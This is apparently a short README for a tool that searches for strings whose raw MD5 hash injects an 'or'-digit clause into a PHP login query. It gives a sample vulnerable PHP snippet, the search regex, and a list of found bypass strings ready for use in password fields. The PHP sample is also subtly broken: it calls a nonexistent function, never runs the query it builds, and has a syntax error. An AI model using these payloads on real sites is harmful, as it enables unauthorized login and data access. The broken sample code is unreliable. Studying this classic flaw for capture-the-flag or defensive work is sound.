# SQLi with Raw MD5 Hashes
The python programs find SQL strings that can be injected into the password field of a webpage, the value of which would be hashed with MD5 before being used in a query. A sample code snippet to hash the user-submitted password is as follows:

```
<?php
    if (isset($_POST['username']) and isset($_POST['password'])) {
        $password = md5($_POST['password'], true);
        $sql_s = "SELECT * FROM users WHERE username='$username' and password='$password'";
        $r = mysql_query("SELECT * FROM users");
        if (mysql_num_query($r) > 0) {
            echo "Successful!";
        }
        else {
            echo "Permission denied"
        }
    }
?>
```
Since `md5()` uses raw hash instead of hexdecimal form, we brute-force to generate raw hashes of random strings and search for matching subsequence. To shorten search time, I use a python reg-ex, `r"('\|\|'\d|'OR'\d|'or'\d)"`. This means any of the `'||'`, `'OR'` or `'or'` sequence followed by a digit is a candidate. For performance concerns, I also implemented a multi-core version of the program, to maximize CPU power. Below are some of the strings I found:
```
6dd4d495bd4e8bc06424d6fd15d4964d8726a44224240e96360fe9a7c10bf659de5f1100608cb31940d66872719bbb46db0780a059921d9152e6d06a3057f4d5
c4a6bfccdeaad008d9c79d0b75cd6104f0f75fa207dba7a62ae3aff415290754cfd72661866960b3b21825742a037d799b285a3ae1b9cf93d629e187d6fb095b
efc974b28da4e129686c71c018b626dc84659a90bfa8d34927a1882efb0f8bf5711aceb67472aa9e7503f6ec1d9d67b57a852859a5d22d77b2939858dee10bc9
febea3796e8e533c7e309951d87d92225b140e26cde7106b504c992b05d79894e20fca1fa900c59a9ee3c6073c2500cd5d1a99ab0004c645b7ac175b95f4c460
65a3268f43852bfdb5adbd3209363af5a0a69386de4d1e015ffd8812b901f9e27cb706e97b032bf0974de459797774a1dec6da3871222fb68edee3e74c6700f5
f1d728e2a6455f1dd6038256a5e0c965ff35ff4fc1741a0a4c9f4e18c7e371a634ab0e85824e96e9c13c4f792c3026715ecc7879c1c1fe608de1a24690a5b7b1
b49c7f9cef6e17145184de4bfb3fd32dca386d925f8ab1db9517755892c026df85f3f9a41fcd900f229f4fc6b9cf32e99c1305f7cf6f1e3a3fbb81b0ba1e6010
```
